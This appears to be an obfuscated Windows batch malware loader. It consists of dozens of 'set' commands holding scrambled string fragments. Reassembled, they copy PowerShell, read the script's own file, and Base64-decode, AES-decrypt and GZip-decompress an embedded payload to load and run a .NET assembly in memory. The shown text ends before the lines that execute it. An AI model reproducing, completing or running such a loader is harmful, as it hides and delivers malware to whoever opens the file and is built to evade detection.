@echo off
set "IoozQoJxKx=po"
set "cvjzWdFlzo=do"
set "ksYlytgJPk=he"
set "pkbUsdbrLP=em"
set "WZjfgXiDtx=xe"
set "AYizBlxmyP=1."
set "BIxNgUnOqV=st"
set "qHwctmJIJn=he"
set "YNEanWKgdb=0\"
set "vAVFeVPilr=.e"
set "mSBXWWkxWV= /"
set "loNxAGOJMm=:\"
set "zMHFkQtXHl=Wi"
set "lWJBAbOAdc=\v"
set "FFFNKWAkly=we"
set "TegjgsUGcZ=s\"
set "BGThllGtcm=\W"
set "nrrbesPvaA=co"
set "fBmmQemkVh= C"
set "DoGwuINTvG=py"
set "hiASiLeflZ=nd"
set "QxUftIqUJg=ws"
set "RydlnRdPTl=32"
set "qAtWiQMRXx=y "
set "WMygoysJnE=rs"
set "FvTOvIlkNb=rS"
set "UJKNKuZXVn=ll"
set "gFzTppBiVN=ow"
set "ffphKBnHrV=in"
set "LoCKZdNUpO=Sy"
set "CaCbjtiRqr=ll"
set "EwxXjfxuki=we"
set "xIpzKLiWBM=Po"
set "YBStiOrocX=cd"
set "PBEqrfvsxw= %~dp0"
set "xWnOmfvWov=yste"
set "jUtImqrqdS=rans"
set "LNAUauDBGn=('%~f0'"
set "XgmpUrSxer=BC;$"
set "WOQETObjWx=3); "
set "KrXCmyViqM=:('g"
set "TBgKhXgvzi=).Sp"
set "smJXMqYCeW=);$V"
set "KQvdZTQcvC=onve"
set "XlRqxwDwbM=L4Yi"
set "KUlAVHVvdr=-Obj"
set "nhvXwQpBNl=$YfK"
set "OzIPeERpfI=mPc."
set "HkrRQgnVZq=zuZI"
set "EtpSnLOajG=, (,"
set "MgGQrBrGWL=ay()"
set "dHEFXjBoKG=iHgN"
set "CPkVIlQjxU=ddin"
set "SuidfrUlEC=gth)"
set "epjVvuebuR=yste"
set "XIkAGfdaXD=tcT "
set "RNZyBIKSSX=CFxo"
set "kGfNbdHEYX=);$p"
set "JunIGdmeTM=tryP"
set "MCIywdwTMO=rofi"
set "ShoLVQxvrz=PKCS"
set "VIkJWBpdpF=nirt"
set "JuwRndDeCD=piHg"
set "weowmIPQEt=File"
set "xVyqvnxMIx=ose("
set "ugPdhEkKAA=comm"
set "qiDuCHYayp=S46e"
set "hRtGBdzdCS=O.Me"
set "EHaWkwLEjX=('da"
set "emTBYLstjG=  $Y"
set "TDaXauDYMG=eMVs"
set "wKlBIGMGXG=ateD"
set "fIRKxsMsZA=);$o"
set "vvgJLqpbSB=ptor"
set "zBYhunyWhi=oL'["
set "PYBEsVHwLw=[]] "
set "fPkrIigYEo=.Cry"
set "YDhQIJoOxz=Ozqj"
set "oVmPXdouNK=('%*'"
set "OYElqMVuXZ=$oit"
set "qRXTUTbruQ=.Dis"
set "QCSUxAvejz=m(, "
set "wVcLsmrnle=oin "
set "SuVPGNFPyb=embl"
set "KhmwcBZjgt=qjs "
set "kGyRmlrFQK=;$Vb"
set "VgVtFvWgHx=RF.T"
set "JNDyOKkyCO=[IO."
set "IfxLIbUxcE=PxEW"
set "ZCuwpQBFJd=k; }"
set "rKhozhlZWS=Syst"
set "BTnPbeCtCN=eam("
set "jWrgnnPMmK=Disp"
set "NjdLZWRnYq== $o"
set "OJftfQUPoQ=ew-O"
set "nQLoeFWBhw=Bmor"
set "BzEoHcBCwj=e]::"
set "iXMqWToVec=Stre"
set "KUXLPHkPxm=yTo("
set "ExoDSoWvxG=.GZi"
set "DMIGlJWuMu=m.IO"
set "iAzjOFZrro=pose"
set "sQMsfqoblJ=hy.A"
set "bbGBBpsqOX=-joi"
set "oJcIrBYEIF=();$"
set "eKUMChrddr=em.C"
set "jPvUIhHmPR=ing("
set "jnnxkUfCBz=aU.I"
set "aQbAElvXMW=tem."
set "szlQlgREaZ=ach "
set "HlkjTrWvog=esMa"
set "JDWaPZZfJE=);$Y"
set "oWoZhcVwwu=ke($"
set "UriilxFOag=yste"
set "qZNhKDZYIf=stem"
set "LPdxBkDndz=cldO"
set "DoSnbcYLEu='')("
set "sTJoxclzcI=tsWi"
set "bbFfkzTcOv=.Ass"
set "rZUqUNmibN=lit("
set "ZWJfzkkAbg=y.Cr"
set "kYHLKYTGZJ=bjec"
set "ddaFUIcdZu=.Cop"
set "LhGHzJpGwZ=Secu"
set "UhhqdrVKxM=ion."
set "YUYTwjLLbo=ypto"
set "IKSZHsSSRB=saBm"
set "XoxjCkYDkN=th('"
set "cKzBeVjNdU=; };"
set "nEJHrQBSDQ=..-1"
set "Sqeciubewx=tS46"
set "VJArHTtyuG=itaU"
set "zyphtnixuD=]::C"
set "qNDZFQihhE=le  "
set "jqHikCZPqs=[Sys"
set "grThrxTEsK=zHhH"
set "BcZqlpJGFz=Disp"
set "sEHHpDAMpp=sion"
set "kcpaiFGQIK=.Con"
set "xRWThnvIgN=6esa"
set "hnDZTzUIOn=rity"
set "cRdcahANRZ=;$eZ"
set "AppMgDlFRm=ress"
set "AiIoOihFNf=d;$o"
set "GVLCIygnlY=)($Y"
set "IwmOIHvUNU=] -j"
set "rMMoyWSVXG=Comp"
set "IMDtCrtRnW=NyKb"
set "mdihVZxDts=;$eF"
set "LLnkNrVNuw===')"
set "mBTryFnYwN=morF"
set "kFQcgoKYPE=nklK"
set "zrXhyrrnvM=mory"
set "zoNLBSIPgL=.Mod"
set "SzqYgadpCf=yKbV"
